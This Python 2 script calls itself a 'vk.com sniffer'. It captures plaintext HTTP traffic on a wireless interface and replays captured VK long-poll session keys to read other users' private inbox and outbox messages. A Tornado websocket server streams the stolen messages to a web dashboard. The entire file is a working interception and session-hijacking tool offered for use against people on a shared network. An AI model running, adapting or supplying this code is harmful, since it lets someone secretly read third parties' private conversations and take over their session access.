from tornado import websocket, web, ioloop
from scapy.all import sniff
from scapy_http import http
from threading import Thread
import json
from urlparse import parse_qs, urlparse
from random import randint
import requests

#   -- vk.com sniffer  --

users_cache = {}

def get_user_by_id(id):
	if id in users_cache:
		return users_cache[id]
	else:
		params = {
			"fields": "photo_100",
			"user_ids": id
		}
		res = json.loads(requests.get("https://api.vk.com/method/users.get", params=params).text)
		name = res["response"][0]["first_name"] + ' ' + res["response"][0]["last_name"]
		photo = res["response"][0]["photo_100"]
		user = {
			"id": id,
			"name": name,
			"photo": photo
		}
		users_cache[id] = user
		return user

messages = list()

def receive(pkt):
	if pkt.haslayer(http.HTTPRequest):
		layer = pkt.getlayer(http.HTTPRequest)
		url = "http://" + layer.fields["Host"] + layer.fields["Path"]
		if "act=a_check&key" not in url or "custom" in url : return
		#print url
		params = parse_qs(urlparse(url).query, keep_blank_values=True)
		params["ts"][0] = int(str(params["ts"][0])) - 200
		params["custom"] = "true"
		params["wait"] = 1
		url = "http://" + urlparse(url).netloc + urlparse(url).path
		res = requests.get(url, params=params)
		#print res.text
		try:
			obj = json.loads(res.text)
		except:
			print "Cant parse JSON"
			obj = {}
		if "updates" not in obj: return
		for item in obj["updates"]:
			if item[0] == 4:
				m_id, flag, u_id, time, msg = item[1], item[2], item[3], item[4], item[6]
				if (m_id in messages): continue
				message = {
					'id': randint(0,9999999),
					'user': get_user_by_id(u_id),
					'text': msg,
					'time': time,
					'type': "OUTBOX" if (int(flag)&2 != 0) else "INBOX"
				}
				messages.append(m_id)
				#print message
				print message["type"]+": "+message["user"]["name"]+" -- "+message["text"]
				send_message(message)


def start_sniff():
    sniff(iface='wlan0', prn=receive, filter="tcp and port 80")
    pass


#   -- Socket Web Server  --

clients = []

class SocketHandler(websocket.WebSocketHandler):
    def check_origin(self, origin):
        return True

    def open(self):
        print "opened"
        if self not in clients:
            clients.append(self)

    def on_message(self, message):
        pass

    def on_close(self):
        print "closed"
        if self in clients:
            clients.remove(self)

app = web.Application([
    (r'/ws', SocketHandler),
    (r'/(.*)', web.StaticFileHandler, {'path': './web/dist/', "default_filename": "index.html"}),
])

def send_message(message):
    for client in clients:
        client.write_message(message)

if __name__ == '__main__':
	app.listen(3000)
	sniffer = Thread(target = start_sniff)
	sniffer.daemon = True
	sniffer.start()
	main_loop = ioloop.IOLoop.instance().start()
